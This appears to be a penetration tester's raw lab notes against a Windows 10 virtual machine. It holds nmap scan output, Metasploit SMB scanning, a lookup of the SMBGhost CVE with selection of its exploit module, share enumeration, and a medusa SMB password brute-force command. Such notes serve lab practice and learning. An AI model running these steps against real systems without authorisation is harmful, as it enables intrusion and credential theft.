ORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
MAC Address: 00:50:56:11:7D:D9 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019|XP (90%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_xp::sp3
Aggressive OS guesses: Microsoft Windows 10 1909 (90%), Microsoft Windows Server 2019 (90%), Microsoft Windows XP SP3 (85%), Microsoft Windows XP SP2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


nikto -h 10.0.0.9
use auxiliary/scanner/smb/smb_version
*****************************************
#ran auxillary scan of SMB port
use auxiliary/scanner/smb/smb_version
*] 10.0.0.9:445          - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:) (encryption capabilities:AES-128-GCM) (signatures:optional) (guid:{273437c3-c818-4f0a-bc5d-4eb255e94b01}) (authentication domain:WIN10PRO64)
[*] 10.0.0.9:             - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
#used version to google search for CVE
CVE-2020-0796
#search metasploit for CVE
search cve:2020 platform:windows name:smb
0  exploit/windows/local/cve_2020_0796_smbghost  2020-03-13       good     Yes    SMBv3 Compression Buffer Overflow
1  exploit/windows/smb/cve_2020_0796_smbghost    2020-03-13       average  Yes    SMBv3 Compression Buffer Overflow
   use 
#set the exploit
use exploit/windows/local/cve_2020_0796_smbghost
use auxiliary/scanner/netbios/nbname
exploit/windows/smb/smb_doublepulsar_rce                           2017-04-14       great      Yes    SMB DOUBLEPULSAR Remote Code Execution
   19  exploit/windows/smb/smb_deliver

smbclient -L \\\\10.0.0.9
nmap -Pn --script smb-enum-shares -p 139,445 10.0.0.9
nmap -Pn --script 10.0.0.9 smb-vuln*

use auxiliary/scanner/dcerpc/endpoint_mapper
use auxiliary/scanner/dcerpc/hidden
use auxiliary/scanner/dcerpc/management
use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor

medusa -h 10.0.0.9 -U /home/kali/Desktop/username.txt -P /home/kali/Desktop/passwords.txt -M smbnt
